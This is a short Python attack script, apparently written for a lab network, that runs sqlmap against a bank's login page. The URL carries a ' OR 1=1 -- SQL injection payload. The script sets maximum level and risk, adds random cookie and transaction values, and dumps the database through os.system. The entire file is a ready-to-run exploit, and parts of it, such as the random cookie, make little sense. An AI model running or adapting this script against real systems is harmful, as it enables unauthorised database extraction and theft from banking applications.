import os
import random
import string

blue_server = "http://blue.usc-bank3.usc430/blue/login.php?user=<username>' OR 1=1 --&pass=<password>"

# Generate random cookie
cookie = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

# Generate random action and amount
actions = ["withdraw", "deposit"]
action = random.choice(actions)
amount = random.randint(1, 1000)

# Construct the SQLmap command
command = f"sqlmap -u \"{blue_server}\" --cookie=\"{cookie}\" --data=\"action={action}&amount={amount}\" --level=5 --risk=3 --batch --dump"

# Run the SQLmap command
os.system(command)
